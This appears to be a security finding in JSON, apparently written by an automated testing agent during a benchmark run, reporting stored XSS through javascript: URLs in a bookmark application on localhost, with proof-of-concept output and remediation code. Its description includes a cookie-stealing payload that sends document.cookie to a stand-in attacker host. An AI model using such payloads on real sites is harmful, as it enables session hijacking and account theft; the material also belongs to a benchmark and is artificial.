{
  "title": "Stored XSS via URL Field Using JavaScript Protocol Handler",
  "severity": "HIGH",
  "description": "The /add endpoint allows users to submit bookmark URLs that are stored and displayed on the /list page without proper validation or sanitization. The application accepts dangerous protocol handlers like 'javascript:' and 'vbscript:' in the URL field. When these URLs are displayed as clickable links on the list page, they can execute arbitrary JavaScript code when clicked by users. This is a Stored Cross-Site Scripting (XSS) vulnerability that persists in the application's storage.\n\nThe vulnerability exists because:\n1. The /add endpoint does not validate URL protocols\n2. Dangerous protocols (javascript:, vbscript:, data:) are accepted and stored\n3. The stored URLs are rendered directly in href attributes without encoding\n4. User input flows directly to HTML output without sanitization\n\nAn attacker can craft a malicious URL like `javascript:alert(1)` or `javascript:document.location='http://attacker.com/steal?cookie='+document.cookie` to execute arbitrary code in the context of any user who clicks the link.",
  "impact": "An attacker can execute arbitrary JavaScript code in the browsers of any user who views the bookmark list, potentially leading to:\n- Session hijacking (stealing session cookies)\n- Credential theft (capturing login attempts)\n- Account takeover (modifying user settings or data)\n- Malware distribution (redirecting to malicious sites)\n- Defacement (altering page content)\n- Keylogging and form hijacking\n\nSince this is a Stored XSS vulnerability, the payload persists and affects all users who view the compromised bookmark list, making it particularly dangerous for multi-user systems.",
  "endpoint": "http://localhost:5000/add",
  "evidence": "POC Execution Results:\n\nCommand executed:\n```bash\n./pocs/poc_stored_xss_javascript_protocol.sh http://localhost:5000\n```\n\nOutput:\n```\n[*] Stored XSS via JavaScript Protocol Handler POC\n[*] Target: http://localhost:5000\n\n[+] Step 1: Loading initial page to establish session...\n[✓] Session established\n\n[+] Step 2: Submitting malicious bookmark with javascript: protocol...\n[✓] Payload submitted: javascript:alert('XSS')\n\n[+] Step 3: Retrieving list page to verify stored XSS...\n[✓✓✓] VULNERABILITY CONFIRMED!\n\n[!] The javascript: protocol handler is stored and rendered without sanitization\n\n[!] Vulnerable HTML found:\n<a class=\"text-decoration-none\" href=\"javascript:alert(&#39;XSS&#39;)\\\" target=\"_blank\">javascript:alert(&#39;XSS&#39;)</a>\n```\n\nThe payload `javascript:alert('XSS')` is:\n1. Accepted by the /add endpoint without validation\n2. Stored in the application's database\n3. Retrieved and rendered directly in the /list page without encoding\n4. Present in the href attribute as `href=\"javascript:alert(&#39;XSS&#39;)\"`\n5. Executable when users click the link (quotes are HTML-encoded but protocol handler still executes)",
  "pocPath": "pocs/poc_stored_xss_javascript_protocol.sh",
  "remediation": "1. **Implement strict URL protocol validation**: Whitelist only safe protocols (http, https). Reject or encode any URLs using dangerous protocols (javascript:, vbscript:, data:, file:, etc.).\n\n2. **Use URL parsing library**: Utilize a robust URL parser to validate and sanitize all user-submitted URLs before storage. Example validation:\n```python\nfrom urllib.parse import urlparse\n\ndef is_safe_url(url):\n    try:\n        parsed = urlparse(url)\n        return parsed.scheme in ['http', 'https']\n    except:\n        return False\n```\n\n3. **Input validation on /add endpoint**: Validate URLs server-side before storing:\n```python\n@app.route('/add', methods=['POST'])\ndef add_bookmark():\n    url = request.form.get('url', '')\n    name = request.form.get('name', '')\n    \n    if not is_safe_url(url):\n        return \"Invalid URL\", 400\n    \n    # Store safely\n    save_bookmark(name, url)\n```\n\n4. **Output encoding in templates**: When rendering URLs in HTML context, use proper attribute encoding:\n```html\n<!-- Jinja2 example -->\n<a href=\"{{ bookmark.url | urlencode }}\" target=\"_blank\">{{ bookmark.name }}</a>\n```\n\n5. **Implement Content-Security-Policy headers**: Add CSP to prevent inline script execution:\n```python\n@app.after_request\ndef set_security_headers(response):\n    response.headers['Content-Security-Policy'] = \"default-src 'self'; script-src 'self'\"\n    return response\n```\n\n6. **URL normalization**: Convert relative URLs to absolute URLs and validate against expected domains if needed.\n\n7. **Regular security testing**: Include XSS payload testing in your test suite to catch similar issues.",
  "references": "OWASP A03:2021 - Injection (Stored XSS)\nCWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nCWE-601 - URL Redirection to Untrusted Site ('Open Redirect')\nOWASP Top 10 2021 - A03:2021 – Injection\nCAPEC-86 - Cross Site Scripting (XSS)\nPortSwigger Web Security Academy - Cross-site scripting (XSS)",
  "toolCallDescription": "Document the confirmed Stored XSS vulnerability with POC evidence",
  "timestamp": "2025-11-07T17:37:51.352Z",
  "sessionId": "benchmark-XBEN-075-24-mhp4u83c",
  "target": "./repo"
}